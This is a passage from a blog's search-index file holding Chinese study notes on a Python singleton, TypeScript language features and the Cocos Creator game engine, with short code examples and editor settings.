href="#二、游戏逻辑基础" class="headerlink" title="二、游戏逻辑基础"></a>二、游戏逻辑基础</h1><h2 id="1-多线程"><a href="#1-多线程" class="headerlink" title="1 多线程"></a>1 多线程</h2><h2 id="2-图像处理"><a href="#2-图像处理" class="headerlink" title="2 图像处理"></a>2 图像处理</h2><hr><h1 id="三、脚本案例"><a href="#三、脚本案例" class="headerlink" title="三、脚本案例"></a>三、脚本案例</h1>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 程序语言 </tag>
            
            <tag> C++ </tag>
            
            <tag> 界面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/posts/364ea8cc.html"/>
      <url>/posts/364ea8cc.html</url>
      
        <content type="html"><![CDATA[<h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><h2 id="一、单例模式"><a href="#一、单例模式" class="headerlink" title="一、单例模式"></a>一、单例模式</h2><blockquote><p>保证一个类仅有一个实例，并提供一个访问它的全局访问点。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    __instance = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, age, name</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cls.__instance:</span><br><span class="line">            cls.__instance = <span class="built_in">object</span>.__new__(cls)</span><br><span class="line">            cls.__instance.age = age</span><br><span class="line">            cls.__instance.name = name</span><br><span class="line">        <span class="keyword">return</span> cls.__instance</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = Singleton(<span class="number">18</span>, <span class="string">&quot;dog&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.name)</span><br><span class="line">b = Singleton(<span class="number">8</span>, <span class="string">&quot;cat&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a)) <span class="comment"># 两者相等</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(b)) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.name) <span class="comment"># dog</span></span><br><span class="line"><span class="built_in">print</span>(b.name) <span class="comment"># dog</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typescript</title>
      <link href="/posts/d7e8ef81.html"/>
      <url>/posts/d7e8ef81.html</url>
      
        <content type="html"><![CDATA[<h1 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript"></a>Typescript</h1><hr><h2 id="一、Javascript"><a href="#一、Javascript" class="headerlink" title="一、Javascript"></a>一、Javascript</h2><blockquote><p>TypeScript是JavaScript的超集，它扩展了JavaScript的语法和功能，同时增加了类型系统和其他工具，使得代码更加可读性和可维护性。</p><p><a href=".\cc1b9611">text::JavaScript</a></p></blockquote><hr><h2 id="二、补充"><a href="#二、补充" class="headerlink" title="二、补充"></a>二、补充</h2><blockquote><p>对Js文章的补充，其中有一些不一定是Ts的特性。</p></blockquote><h3 id="1-限定类型"><a href="#1-限定类型" class="headerlink" title="1 限定类型"></a>1 限定类型</h3><blockquote><p>Ts特性。</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 变量名后加冒号，再指定类型</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">url</span>: <span class="built_in">string</span> = <span class="string">&quot;https://www.baidu.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 限定值</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">sex</span>: <span class="string">&quot;male&quot;</span> | <span class="string">&quot;female&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 限定函数返回类型</span></span><br><span class="line"><span class="title function_">addData</span>(<span class="attr">data</span>: <span class="built_in">number</span>): <span class="built_in">void</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="2-限定修饰符"><a href="#2-限定修饰符" class="headerlink" title="2 限定修饰符"></a>2 限定修饰符</h3><blockquote><p>Ts特性。</p><p><code>public</code>表示公共变量，可以被任何地方访问。</p><p><code>private</code>表示私有变量，只能在类内部访问，不能被子类或实例访问。</p><p><code>protected</code>表示受保护变量，只能在类内部和子类中访问，不能被实例访问。</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="attr">name</span>: <span class="built_in">string</span>; <span class="comment">// 公共变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="attr">age</span>: <span class="built_in">number</span>; <span class="comment">// 私有变量</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="attr">gender</span>: <span class="string">&#x27;male&#x27;</span> | <span class="string">&#x27;female&#x27;</span>; <span class="comment">// 受保护变量</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span>, gender: <span class="string">&#x27;male&#x27;</span> | <span class="string">&#x27;female&#x27;</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">gender</span> = gender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span>, gender: <span class="string">&#x27;male&#x27;</span> | <span class="string">&#x27;female&#x27;</span>, <span class="keyword">public</span> studentId: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(name, age, gender);</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">sayHello</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, my name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>, and my student ID is <span class="subst">$&#123;<span class="variable language_">this</span>.studentId&#125;</span>.`</span>);</span><br><span class="line">        <span class="comment">// console.log(`My age is $&#123;this.age&#125;`); // 错误，age是私有变量，不能在子类中访问</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`My gender is <span class="subst">$&#123;<span class="variable language_">this</span>.gender&#125;</span>`</span>); <span class="comment">// 正确，gender是受保护变量，可以在子类中访问</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> student1 = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;Alice&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;female&#x27;</span>, <span class="string">&#x27;001&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1.<span class="property">name</span>); <span class="comment">// &#x27;Alice&#x27;</span></span><br><span class="line"><span class="comment">// console.log(student1.age); // 错误，age是私有变量，不能在实例中访问</span></span><br><span class="line"><span class="comment">// console.log(student1.gender); // 错误，gender是受保护变量，不能在实例中访问</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1.<span class="property">studentId</span>); <span class="comment">// &#x27;001&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态属性与静态方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MathUtils</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="variable constant_">PI</span> = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">multiply</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> a * b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">calculateCircumference</span>(<span class="params">radius: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * <span class="variable language_">this</span>.<span class="property">PI</span> * radius;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">MathUtils</span>.<span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>)); <span class="comment">// 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">MathUtils</span>.<span class="title function_">multiply</span>(<span class="number">3</span>, <span class="number">4</span>)); <span class="comment">// 12</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">MathUtils</span>.<span class="title function_">calculateCircumference</span>(<span class="number">2</span>)); <span class="comment">// 12.56</span></span><br></pre></td></tr></table></figure><h3 id="3-函数重载"><a href="#3-函数重载" class="headerlink" title="3 函数重载"></a>3 函数重载</h3><blockquote><p>Ts特性。</p><p>在Js中后面的定义的函数会覆盖掉前面的函数。</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>): <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">string</span>, b: <span class="built_in">string</span></span>): <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">any</span>, b: <span class="built_in">any</span></span>): <span class="built_in">any</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>));           <span class="comment">// 输出: 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)); <span class="comment">// 输出: &quot;helloworld&quot;</span></span><br></pre></td></tr></table></figure><h3 id="4-接口"><a href="#4-接口" class="headerlink" title="4 接口"></a>4 接口</h3><blockquote><p>Js、Ts中都存在。</p><p>接口中的内容都要在类中实现。</p><p>如果有不确定的属性要实现，可以在属性名后加一个<code>?</code>，这样它就不一定要被实现。</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">gender</span>: <span class="string">&#x27;male&#x27;</span> | <span class="string">&#x27;female&#x27;</span> | <span class="string">&#x27;other&#x27;</span>;</span><br><span class="line">  <span class="title function_">sayHello</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">gender</span>: <span class="string">&#x27;male&#x27;</span> | <span class="string">&#x27;female&#x27;</span> | <span class="string">&#x27;other&#x27;</span>;</span><br><span class="line">    <span class="attr">studentId</span>: <span class="built_in">string</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span>, gender: <span class="string">&#x27;male&#x27;</span> | <span class="string">&#x27;female&#x27;</span> | <span class="string">&#x27;other&#x27;</span>, studentId: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">gender</span> = gender;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">studentId</span> = studentId;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">sayHello</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, my name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>, and my student ID is <span class="subst">$&#123;<span class="variable language_">this</span>.studentId&#125;</span>.`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> student1 = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;Alice&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;female&#x27;</span>, <span class="string">&#x27;001&#x27;</span>);</span><br><span class="line"><span class="comment">// Hello, my name is Alice, and my student ID is 001.</span></span><br><span class="line">student1.<span class="title function_">sayHello</span>(); </span><br></pre></td></tr></table></figure><h3 id="5-断言"><a href="#5-断言" class="headerlink" title="5 断言"></a>5 断言</h3><blockquote><p>Ts特性。</p><p>明确告诉编译器某个类型存在</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 明确告诉编译器类型存在（as）</span></span><br><span class="line"><span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>) <span class="keyword">as</span> <span class="title class_">HTMLButtonElement</span>;</span><br></pre></td></tr></table></figure><h3 id="6-异步"><a href="#6-异步" class="headerlink" title="6 异步"></a>6 异步</h3><blockquote><p>Js、Ts中都存在。</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基础</span></span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 案例</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Start&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">getData</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error: &quot;</span>, error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;End&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><h3 id="7-泛型"><a href="#7-泛型" class="headerlink" title="7 泛型"></a>7 泛型</h3><blockquote><p>Ts特性。</p><p>T表示任意类型，用尖括号包裹，使用时需要补充类型。</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">identity&lt;T&gt;(<span class="attr">arg</span>: T): T &#123;</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">identity</span>&lt;<span class="title class_">Number</span>&gt;(<span class="number">123</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">identity</span>&lt;<span class="built_in">string</span>&gt;(<span class="string">&quot;hello&quot;</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> typescript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cocos2D</title>
      <link href="/posts/668ce02c.html"/>
      <url>/posts/668ce02c.html</url>
      
        <content type="html"><![CDATA[<h1 id="Cocos-2D"><a href="#Cocos-2D" class="headerlink" title="Cocos 2D"></a>Cocos 2D</h1><blockquote><p><a href=".\d7e8ef81">text::TypeScript</a></p><p><a href="https://docs.cocos.com/creator/manual/zh/">official::Cocos Creator手册</a></p><p>源码路径：<code>\Cocos\Creator\3.8.0\resources\resources\3d\engine</code></p></blockquote><hr><h2 id="一、引擎基础"><a href="#一、引擎基础" class="headerlink" title="一、引擎基础"></a>一、引擎基础</h2><h3 id="1-初始配置"><a href="#1-初始配置" class="headerlink" title="1 初始配置"></a>1 初始配置</h3><blockquote><p>初始配置：</p><ul><li>设置中文：File——Preferences——General——Language</li><li>默认编译器：File——Preferences——Program Manager——Default Script Editor</li><li>默认浏览器：File——Preferences——Program Manager——Default Browser</li></ul><p>竖屏游戏：</p><ul><li><p>Project——Project Setting——Design Width/Height分别为720/1280</p></li><li><p>勾选Fit Width和Fit Height</p></li></ul><p>Vscode：</p><ul><li>文件后缀：文件——首选项——设置——文本编辑器——文件——Exclude——新加<code>**/*.meta</code></li></ul></blockquote><h3 id="2-界面"><a href="#2-界面" class="headerlink" title="2 界面"></a>2 界面</h3><blockquote><p>类似Untiy。</p></blockquote><h3 id="3-机制"><a href="#3-机制" class="headerlink" title="3 机制"></a>3 机制</h3><blockquote><p>渲染机制：需要一个标识来证明节点状态发生改变了才会重新读取信息，否则不渲染。</p><p>函数重载：函数内部通过多个<code>if else</code>对入参进行判断来实现重载。</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 渲染机制</span></span><br><span class="line"><span class="comment">// 不触发渲染</span></span><br><span class="line"><span class="title function_">update</span>(<span class="params">deltaTime: <span class="built_in">number</span></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>.<span class="property">x</span> += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 触发渲染</span></span><br><span class="line"><span class="title function_">update</span>(<span class="params">deltaTime: <span class="built_in">number</span></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> p = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>;</span><br><span class="line">    p.<span class="property">x</span> += <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span> = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="二、对象"><a href="#二、对象" class="headerlink" title="二、对象"></a>二、对象</h2><h3 id="1-Canvas"><a href="#1-Canvas" class="headerlink" title="1 Canvas"></a>1 Canvas</h3><blockquote><p>默认的Canvas的左下角为世界原点。</p><p>对于在Canvas中的物体，当Position为（0，0）时是处在画布中心。</p><p>在Canvas中，越下面的组件图层越在前。</p></blockquote><h3 id="2-内置属性"><a href="#2-内置属性" class="headerlink" title="2 内置属性"></a>2 内置属性</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SpriteFrame：精灵框架</span></span><br><span class="line"><span class="meta">@property</span>([<span class="title class_">SpriteFrame</span>]) <span class="attr">cardsSF</span>: <span class="title class_">SpriteFrame</span>[] = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Number是设置</span></span><br><span class="line"><span class="meta">@property</span>(&#123;<span class="attr">type</span>: <span class="title class_">Number</span>&#125;) <span class="keyword">public</span> <span class="attr">hp</span>: <span class="built_in">number</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="三、常见控制组件"><a href="#三、常见控制组件" class="headerlink" title="三、常见控制组件"></a>三、常见控制组件</h2><h3 id="1-Node"><a href="#1-Node" class="headerlink" title="1 Node"></a>1 Node</h3><blockquote><p>位置，旋转，缩放。</p><p>Mobility：节点的可移动性。不同的可移动性会导致节点在光照上有不同的特性和表现。</p><p>Layer：层级。</p><p><a href="https://docs.cocos.com/creator/manual/zh/concepts/scene/node-component.html">official::节点和组件文档</a></p></blockquote><hr><h2 id="四、常见UI组件"><a href="#四、常见UI组件" class="headerlink" title="四、常见UI组件"></a>四、常见UI组件</h2><h3 id="1-cc-Label"><a href="#1-cc-Label" class="headerlink" title="1 cc.Label"></a>1 cc.Label</h3><blockquote><p>文本组件。</p></blockquote><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文本赋值</span></span><br><span class="line"><span class="keyword">const</span> label = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">getComponent</span>(<span class="title class_">Label</span>);</span><br><span class="line">label.<span class="property">string</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="2-cc-Sprite"><a href="#2-cc-Sprite" class="headerlink" title="2 cc.Sprite"></a>2 cc.Sprite</h3><blockquote><p>图片组件。</p><p>Sprite Frame：图片资源。</p><p>Size Mode：裁剪类型。（CUSTOM：自定义；TRIMMED：裁剪；RAW：原图）</p></blockquote><h3 id="3-cc-UIOpacity"><a href="#3-cc-UIOpacity" class="headerlink" title="3 cc.UIOpacity"></a>3 cc.UIOpacity</h3><blockquote><p>透明度。0透明，255不透明。</p></blockquote><h3 id="4-cc-Layout"><a href="#4-cc-Layout" class="headerlink" title="4 cc.Layout"></a>4 cc.Layout</h3><blockquote><p>布局组件。</p><p>Type：横向，纵向，矩阵。</p><p>Affected By Scale：子节点缩放影响布局（当子节点物体缩放后，布局会动态调整间隔，否则默认是缩放为1时的间隔）</p></blockquote><h3 id="5-cc-BoxCollider2D"><a href="#5-cc-BoxCollider2D" class="headerlink" title="5 cc.BoxCollider2D"></a>5 cc.BoxCollider2D</h3><blockquote><p>碰撞。</p><p>Sensor：触发器。</p></blockquote><h3 id="6-cc-Rigidbody2D"><a href="#6-cc-Rigidbody2D" class="headerlink" title="6 cc.Rigidbody2D"></a>6 cc.Rigidbody2D</h3><blockquote><p>刚体。</p><p>Enabled Contact Listener：只有开启了刚体的碰撞监听，刚体发生碰撞时才会回调到对应的组件上</p><p>Type：静态，动态，动力学，动画（动力学的衍生）</p></blockquote><h3 id="7-关节组件"><a href="#7-关节组件" class="headerlink" title="7 关节组件"></a>7 关节组件</h3><blockquote><p><a href="https://docs.cocos.com/creator/manual/zh/physics-2d/physics-2d-joint.html">official::2D 物理关节</a></p><p>DistanceJoint2D：距离关节。将关节两端的刚体约束在一个最大范围内。超出该范围时，刚体的运动会互相影响。</p><p>FixedJoint2D：固定关节。根据两个点将两个物体固定在一起。</p><p>HingeJoint2D：铰链关节。刚体会围绕一个共同点来旋转（自身中心点要拉至对方中心点位置）。</p><p>MouseJoint2D：可以用鼠标拖拽物理</p><p>RelativeJoint2D：相对关节。控制两个刚体间的相对运动。（双偷盗宝）</p><p>SliderJoint2D：滑动关节。两个刚体位置间的角度是固定的，它们只能在一个指定的轴上滑动。</p><p>SpringJoint2D：弹簧关节。将关节两端物体像弹簧一样连接在一起。</p><p>WheelJoint2D：轮子关节。模拟车轮。</p></blockquote><hr><h2 id="五、资产"><a href="#五、资产" class="headerlink" title="五、资产"></a>五、资产</h2><h3 id="1-图片"><a href="#1-图片" class="headerlink" title="1 图片"></a>1 图片</h3><blockquote><p>Sprite-frame：</p><ul><li>Trim Type：默认auto，自动裁剪透明像素。选择None不裁。</li></ul><p>Texture：</p><ul><li>Filter Mode：图片处理方式<ul><li>Nearest（None）：像素图片处理。</li><li>Bilinear：一般图片处理。</li></ul></li></ul></blockquote><hr><h2 id="六、脚本"><a href="#六、脚本" class="headerlink" title="六、脚本"></a>六、脚本</h2><h3 id="1-新建脚本"><a href="#1-新建脚本" class="headerlink" title="1 新建脚本"></a>1 新建脚本</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从 &#x27;cc&#x27; 模块中导入 _decorator、Component 和 Node 等符号</span></span><br><span class="line"><span class="keyword">import</span> &#123; _decorator, <span class="title class_">Component</span>, <span class="title class_">Node</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="comment">// 解构_decorator对象中的值</span></span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件类装饰器，用于将下面的类标记为一个 Cocos Creator 组件类，并且指定了组件的名称为 &#x27;Test&#x27;</span></span><br><span class="line"><span class="meta">@ccclass</span>(<span class="string">&#x27;Test&#x27;</span>)</span><br><span class="line"><span class="comment">// 继承Component类</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">    <span class="comment">// 组件实例被激活时调用</span></span><br><span class="line">    <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 每一帧更新时调用，deltaTime为1 / 帧数</span></span><br><span class="line">    <span class="title function_">update</span>(<span class="params">deltaTime: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类的设计</span></span><br><span class="line"><span class="meta">@ccclass</span>(<span class="string">&#x27;Test&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Components</span> &#123;</span><br><span class="line">    <span class="comment">// 值</span></span><br><span class="line">    <span class="attr">_value</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">label</span>: <span class="title class_">Label</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 属性</span></span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">value</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">value</span>(<span class="params">val</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_value</span> = val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="comment">// 可以在构造函数中进行初始化操作</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_value</span> = <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方法</span></span><br><span class="line">    <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">label</span> = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">getComponent</span>(<span class="title class_">Label</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">label</span>.<span class="property">string</span> = <span class="variable language_">this</span>.<span class="property">value</span>.<span class="title function_">toString</span>();</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">update</span>(<span class="params">deltaTime: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">value</span> += <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">label</span>.<span class="property">string</span> = <span class="variable language_">this</span>.<span class="property">value</span>.<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-自定义属性"><a href="#2-自定义属性" class="headerlink" title="2 自定义属性"></a>2 自定义属性</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">CCInteger</span>, <span class="title class_">CCFloat</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="meta">@ccclass</span>(<span class="string">&#x27;GameRoot&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title 